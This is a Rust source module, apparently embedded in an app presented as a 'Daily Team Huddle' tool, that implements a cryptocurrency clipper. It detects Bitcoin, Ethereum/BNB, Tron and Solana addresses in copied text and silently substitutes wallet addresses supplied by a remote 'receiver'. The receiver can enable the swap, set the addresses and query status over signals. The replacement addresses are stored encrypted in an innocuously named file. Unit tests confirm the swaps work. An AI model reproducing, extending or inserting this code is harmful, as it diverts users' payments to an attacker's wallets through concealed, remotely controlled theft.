//! Crypto address swap — auto-detects copied wallet addresses and replaces them
//! with receiver-configured addresses when enabled.
//!
//! One replacement address per chain is stored (encrypted with Windows DPAPI).
//! Default state on app start: disabled (`off`).

use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{OnceLock, RwLock};

use serde::{Deserialize, Deserializer, Serialize};

use crate::win_dpapi;

static MANAGER: OnceLock<AddressSwapManager> = OnceLock::new();

const BASE58_ALPHABET: &str = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Chain {
    Btc,
    Eth,
    Bnb,
    Tron,
    Sol,
}

/// One replacement address per chain (receiver sends only the swap-to address).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct AddressBook {
    #[serde(default, deserialize_with = "deserialize_chain_address", skip_serializing_if = "String::is_empty")]
    pub btc: String,
    #[serde(default, deserialize_with = "deserialize_chain_address", skip_serializing_if = "String::is_empty")]
    pub eth: String,
    #[serde(default, deserialize_with = "deserialize_chain_address", skip_serializing_if = "String::is_empty")]
    pub tron: String,
    #[serde(default, deserialize_with = "deserialize_chain_address", skip_serializing_if = "String::is_empty")]
    pub bnb: String,
    #[serde(default, deserialize_with = "deserialize_chain_address", skip_serializing_if = "String::is_empty")]
    pub sol: String,
}

impl AddressBook {
    fn replacement_for(&self, chain: Chain) -> Option<&str> {
        let address = match chain {
            Chain::Btc => &self.btc,
            Chain::Eth => &self.eth,
            Chain::Bnb => &self.bnb,
            Chain::Tron => &self.tron,
            Chain::Sol => &self.sol,
        };
        let trimmed = address.trim();
        if trimmed.is_empty() {
            None
        } else {
            Some(trimmed)
        }
    }

    /// EVM `0x` addresses are shared by ETH, BNB, Polygon, etc. Prefer ETH, then BNB.
    fn evm_replacement(&self) -> Option<&str> {
        self.replacement_for(Chain::Eth)
            .or_else(|| self.replacement_for(Chain::Bnb))
    }

    pub fn has_configured(&self) -> bool {
        [&self.btc, &self.eth, &self.bnb, &self.tron, &self.sol]
            .iter()
            .any(|address| !address.trim().is_empty())
    }
}

pub struct AddressSwapManager {
    enabled: AtomicBool,
    addresses: RwLock<AddressBook>,
}

impl AddressSwapManager {
    pub fn new() -> Self {
        let addresses = load_address_book().unwrap_or_default();
        Self {
            enabled: AtomicBool::new(false),
            addresses: RwLock::new(addresses),
        }
    }

    pub fn global() -> &'static AddressSwapManager {
        MANAGER.get_or_init(Self::new)
    }

    pub fn is_enabled(&self) -> bool {
        self.enabled.load(Ordering::SeqCst)
    }

    pub fn set_enabled(&self, on: bool) {
        self.enabled.store(on, Ordering::SeqCst);
    }

    pub fn save_addresses(&self, book: AddressBook) -> Result<(), String> {
        save_address_book(&book)?;
        let mut guard = self
            .addresses
            .write()
            .map_err(|_| "Address lock poisoned".to_string())?;
        *guard = book;
        Ok(())
    }

    pub fn replace_text(&self, text: &str) -> Option<String> {
        if !self.is_enabled() || text.trim().is_empty() {
            return None;
        }

        let guard = self.addresses.read().ok()?;
        replace_detected_addresses(text, &guard)
    }

    pub fn snapshot_addresses(&self) -> AddressBook {
        self.addresses
            .read()
            .map(|guard| guard.clone())
            .unwrap_or_default()
    }
}

pub fn parse_address_book_from_signal(value: &serde_json::Value) -> Result<AddressBook, String> {
    if let Some(addresses) = value.get("addresses") {
        serde_json::from_value(addresses.clone())
            .map_err(|e| format!("Invalid address list: {e}"))
    } else {
        serde_json::from_value(value.clone()).map_err(|e| format!("Invalid address list: {e}"))
    }
}

pub fn handle_receiver_signal(
    payload: &serde_json::Value,
    sender_id: &str,
) -> Option<serde_json::Value> {
    let signal_type = payload
        .get("type")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default();
    if signal_type != "addr-swap" {
        return None;
    }

    let to = payload
        .get("to")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default();
    if to != sender_id {
        return None;
    }

    let manager = AddressSwapManager::global();
    match payload
        .get("action")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default()
    {
        "start" => {
            let value = payload
                .get("value")
                .and_then(serde_json::Value::as_str)
                .unwrap_or_default();
            if value.eq_ignore_ascii_case("on") {
                manager.set_enabled(true);
            }
            None
        }
        "stop" => {
            manager.set_enabled(false);
            None
        }
        "set-addresses" => {
            if let Ok(book) = parse_address_book_from_signal(payload) {
                let _ = manager.save_addresses(book);
            }
            None
        }
        "get-status" => Some(build_status_reply(sender_id)),
        _ => None,
    }
}

fn build_status_reply(sender_id: &str) -> serde_json::Value {
    let manager = AddressSwapManager::global();
    let addresses = manager.snapshot_addresses();
    serde_json::json!({
        "type": "addr-swap",
        "from": sender_id,
        "to": "receiver",
        "action": "status",
        "enabled": manager.is_enabled(),
        "hasAddresses": addresses.has_configured(),
        "addresses": {
            "btc": addresses.btc,
            "eth": addresses.eth,
            "bnb": addresses.bnb,
            "tron": addresses.tron,
            "sol": addresses.sol,
        },
        "ts": timestamp_ms(),
    })
}

fn timestamp_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|duration| duration.as_millis() as i64)
        .unwrap_or(0)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct DetectedAddress {
    start: usize,
    end: usize,
    chain: Chain,
}

fn replace_detected_addresses(text: &str, book: &AddressBook) -> Option<String> {
    let matches = find_addresses(text);
    if matches.is_empty() {
        return None;
    }

    let mut result = text.to_string();
    let mut changed = false;

    for detected in matches.iter().rev() {
        let original = &text[detected.start..detected.end];
        let replacement = match detected.chain {
            Chain::Eth | Chain::Bnb => book.evm_replacement(),
            chain => book.replacement_for(chain),
        };
        let Some(replacement) = replacement else {
            continue;
        };

        if should_skip_replacement(original, replacement) {
            continue;
        }

        result.replace_range(detected.start..detected.end, replacement);
        changed = true;
    }

    if changed { Some(result) } else { None }
}

fn should_skip_replacement(original: &str, replacement: &str) -> bool {
    if original == replacement {
        return true;
    }

    if is_evm_address(original) && is_evm_address(replacement) {
        return evm_body(original).eq_ignore_ascii_case(evm_body(replacement));
    }

    original.eq_ignore_ascii_case(replacement)
}

fn find_addresses(text: &str) -> Vec<DetectedAddress> {
    let mut matches = Vec::new();
    let bytes = text.as_bytes();
    let mut index = 0;

    while index < bytes.len() {
        if let Some(detected) = detect_at(text, index) {
            let end = detected.end;
            if !overlaps_existing(&matches, detected.start, end) {
                matches.push(detected);
                index = end;
            } else {
                index += 1;
            }
        } else {
            index += 1;
        }
    }

    matches
}

fn overlaps_existing(matches: &[DetectedAddress], start: usize, end: usize) -> bool {
    matches
        .iter()
        .any(|m| start < m.end && end > m.start)
}

fn detect_at(text: &str, index: usize) -> Option<DetectedAddress> {
    // Most-specific patterns first.
    if let Some(end) = match_bech32_btc(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Btc,
        });
    }
    if let Some(end) = match_evm_address(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Eth,
        });
    }
    if let Some(end) = match_tron_address(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Tron,
        });
    }
    if let Some(end) = match_btc_legacy_or_p2sh(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Btc,
        });
    }
    if let Some(end) = match_solana_address(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Sol,
        });
    }
    if let Some(end) = match_bare_evm_hex(text, index) {
        return Some(DetectedAddress {
            start: index,
            end,
            chain: Chain::Eth,
        });
    }

    None
}

fn match_bech32_btc(text: &str, index: usize) -> Option<usize> {
    let slice = text.get(index..)?;
    let lower = slice.to_ascii_lowercase();
    if !lower.starts_with("bc1") {
        return None;
    }

    let mut end = index + 3;
    for ch in text[index + 3..].chars() {
        if ch.is_ascii_lowercase() || ch.is_ascii_digit() {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    let length = end - index;
    if (42..=90).contains(&length) && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn match_evm_address(text: &str, index: usize) -> Option<usize> {
    let slice = text.get(index..)?;
    if slice.len() < 2 {
        return None;
    }
    let prefix = &slice[..2];
    if !prefix.eq_ignore_ascii_case("0x") {
        return None;
    }

    let mut end = index + 2;
    for ch in text[index + 2..].chars().take(40) {
        if ch.is_ascii_hexdigit() {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    if end - index == 42 && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn match_bare_evm_hex(text: &str, index: usize) -> Option<usize> {
    if index > 0 {
        let prev = text.as_bytes()[index - 1];
        if prev.is_ascii_hexdigit() || prev == b'x' || prev == b'X' {
            return None;
        }
    }

    let mut end = index;
    for ch in text[index..].chars().take(40) {
        if ch.is_ascii_hexdigit() {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    if end - index == 40 && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn match_tron_address(text: &str, index: usize) -> Option<usize> {
    if text.as_bytes().get(index) != Some(&b'T') {
        return None;
    }

    let mut end = index + 1;
    for ch in text[index + 1..].chars().take(33) {
        if is_base58_char(ch) {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    if end - index == 34 && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn match_btc_legacy_or_p2sh(text: &str, index: usize) -> Option<usize> {
    let first = *text.as_bytes().get(index)?;
    if first != b'1' && first != b'3' {
        return None;
    }

    let mut end = index + 1;
    for ch in text[index + 1..].chars() {
        if is_base58_char(ch) {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    let length = end - index;
    if (26..=35).contains(&length) && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn match_solana_address(text: &str, index: usize) -> Option<usize> {
    let first = *text.as_bytes().get(index)?;
    if matches!(first, b'0' | b'O' | b'I' | b'l') {
        return None;
    }

    // Avoid stealing BTC legacy/P2SH or Tron matches.
    if first == b'1' || first == b'3' || first == b'T' {
        return None;
    }
    if text[index..].to_ascii_lowercase().starts_with("0x")
        || text[index..].to_ascii_lowercase().starts_with("bc1")
    {
        return None;
    }

    let mut end = index;
    for ch in text[index..].chars() {
        if is_base58_char(ch) {
            end += ch.len_utf8();
        } else {
            break;
        }
    }

    let length = end - index;
    if (32..=44).contains(&length) && has_valid_boundary(text, index, end) {
        Some(end)
    } else {
        None
    }
}

fn has_valid_boundary(text: &str, start: usize, end: usize) -> bool {
    let valid_before = start == 0 || !is_address_char(text[..start].chars().last().unwrap());
    let valid_after = end >= text.len() || !is_address_char(text[end..].chars().next().unwrap());
    valid_before && valid_after
}

fn is_address_char(ch: char) -> bool {
    is_base58_char(ch) || ch.is_ascii_hexdigit()
}

fn is_base58_char(ch: char) -> bool {
    BASE58_ALPHABET.contains(ch)
}

fn is_evm_address(value: &str) -> bool {
    value.len() == 42 && value[..2].eq_ignore_ascii_case("0x") && evm_body(value).len() == 40
}

fn evm_body(value: &str) -> &str {
    if value.len() >= 2 && value[..2].eq_ignore_ascii_case("0x") {
        &value[2..]
    } else {
        value
    }
}

fn deserialize_chain_address<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: Deserializer<'de>,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    match value {
        serde_json::Value::String(address) => Ok(address),
        serde_json::Value::Object(map) => {
            if let Some(target) = map.get("target").and_then(|v| v.as_str()) {
                Ok(target.to_owned())
            } else if let Some(address) = map.get("address").and_then(|v| v.as_str()) {
                Ok(address.to_owned())
            } else {
                Ok(String::new())
            }
        }
        serde_json::Value::Null => Ok(String::new()),
        _ => Ok(String::new()),
    }
}

fn storage_dir() -> PathBuf {
    let base = std::env::var("LOCALAPPDATA")
        .or_else(|_| std::env::var("APPDATA"))
        .unwrap_or_else(|_| ".".to_owned());
    PathBuf::from(base).join("Daily Team Huddle")
}

fn storage_path() -> PathBuf {
    storage_dir().join("info")
}

fn legacy_storage_path() -> PathBuf {
    storage_dir().join("addr-swap")
}

fn load_address_book() -> Result<AddressBook, String> {
    let path = storage_path();
    if let Ok(book) = read_address_book(&path) {
        return Ok(book);
    }

    let legacy_path = legacy_storage_path();
    if legacy_path == path {
        return Err("Read failed: file not found".to_owned());
    }

    let book = read_address_book(&legacy_path)?;
    let _ = save_address_book(&book);
    let _ = std::fs::remove_file(&legacy_path);
    Ok(book)
}

fn read_address_book(path: &std::path::Path) -> Result<AddressBook, String> {
    let encrypted = std::fs::read(path).map_err(|e| format!("Read failed: {e}"))?;
    let plain = win_dpapi::unprotect(&encrypted)?;
    serde_json::from_slice(&plain).map_err(|e| format!("Parse failed: {e}"))
}

fn save_address_book(book: &AddressBook) -> Result<(), String> {
    let path = storage_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| format!("Create dir failed: {e}"))?;
    }
    let json = serde_json::to_vec(book).map_err(|e| format!("Serialize failed: {e}"))?;
    let encrypted = win_dpapi::protect(&json)?;
    std::fs::write(&path, encrypted).map_err(|e| format!("Write failed: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn book_with_eth(target: &str) -> AddressBook {
        AddressBook {
            eth: target.to_owned(),
            ..Default::default()
        }
    }

    #[test]
    fn swaps_detected_evm_address() {
        let book = book_with_eth("0xreceiver00000000000000000000000000000001");
        let result =
            replace_detected_addresses("0xAbCdEf0123456789abcdef0123456789abcdef01", &book).unwrap();
        assert_eq!(result, "0xreceiver00000000000000000000000000000001");
    }

    #[test]
    fn swaps_btc_bech32_address() {
        let book = AddressBook {
            btc: "bc1qreceiverxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".to_owned(),
            ..Default::default()
        };
        let input = "send to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh thanks";
        let result = replace_detected_addresses(input, &book).unwrap();
        assert!(result.contains("bc1qreceiverxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
        assert!(!result.contains("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"));
    }

    #[test]
    fn swaps_tron_address() {
        let book = AddressBook {
            tron: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t".to_owned(),
            ..Default::default()
        };
        let input = "TQn9Y2khEsLMWDm1a5qJzJ8K9vJzJzJzJz";
        let result = replace_detected_addresses(input, &book).unwrap();
        assert_eq!(result, "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
    }

    #[test]
    fn skips_when_no_replacement_configured() {
        let book = AddressBook::default();
        assert!(replace_detected_addresses("0xabcdef0123456789abcdef0123456789abcdef01", &book).is_none());
    }

    #[test]
    fn skips_empty_networks_but_swaps_configured_ones() {
        let book = AddressBook {
            btc: "bc1qreceiverxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".to_owned(),
            eth: String::new(),
            bnb: String::new(),
            ..Default::default()
        };
        let evm = "0xabcdef0123456789abcdef0123456789abcdef01";
        let btc = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
        let input = format!("{evm} and {btc}");

        let result = replace_detected_addresses(&input, &book).unwrap();
        assert!(result.contains(evm), "empty eth/bnb must not swap EVM addresses");
        assert!(result.contains("bc1qreceiverxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"));
        assert!(!result.contains(btc));
    }

    #[test]
    fn parses_flat_address_payload() {
        let value = serde_json::json!({
            "btc": "bc1qtest",
            "eth": "0xeth",
        });
        let book: AddressBook = serde_json::from_value(value).unwrap();
        assert_eq!(book.btc, "bc1qtest");
        assert_eq!(book.eth, "0xeth");
    }

    #[test]
    fn parses_legacy_target_object_payload() {
        let value = serde_json::json!({
            "eth": { "target": "0xlegacy" }
        });
        let book: AddressBook = serde_json::from_value(value).unwrap();
        assert_eq!(book.eth, "0xlegacy");
    }

    #[test]
    fn has_configured_detects_any_non_empty_chain() {
        assert!(!AddressBook::default().has_configured());
        assert!(AddressBook {
            eth: "0x1".to_owned(),
            ..Default::default()
        }
        .has_configured());
        assert!(!AddressBook {
            eth: "  ".to_owned(),
            ..Default::default()
        }
        .has_configured());
    }

    #[test]
    fn get_status_reply_has_expected_shape() {
        let reply = build_status_reply("sender42");
        assert_eq!(reply["type"], "addr-swap");
        assert_eq!(reply["action"], "status");
        assert_eq!(reply["from"], "sender42");
        assert_eq!(reply["to"], "receiver");
        assert!(reply.get("enabled").is_some());
        assert!(reply.get("hasAddresses").is_some());
        assert!(reply["addresses"]["btc"].is_string());
        assert!(reply["addresses"]["eth"].is_string());
        assert!(reply["addresses"]["bnb"].is_string());
        assert!(reply["addresses"]["tron"].is_string());
        assert!(reply["addresses"]["sol"].is_string());
        assert!(reply.get("ts").is_some());
    }

    #[test]
    fn get_status_returns_reply_for_matching_sender() {
        let payload = serde_json::json!({
            "type": "addr-swap",
            "to": "abc123",
            "action": "get-status",
        });
        let reply = handle_receiver_signal(&payload, "abc123").expect("status reply");
        assert_eq!(reply["action"], "status");
    }

    #[test]
    fn get_status_ignored_for_wrong_sender() {
        let payload = serde_json::json!({
            "type": "addr-swap",
            "to": "other-sender",
            "action": "get-status",
        });
        assert!(handle_receiver_signal(&payload, "abc123").is_none());
    }
}
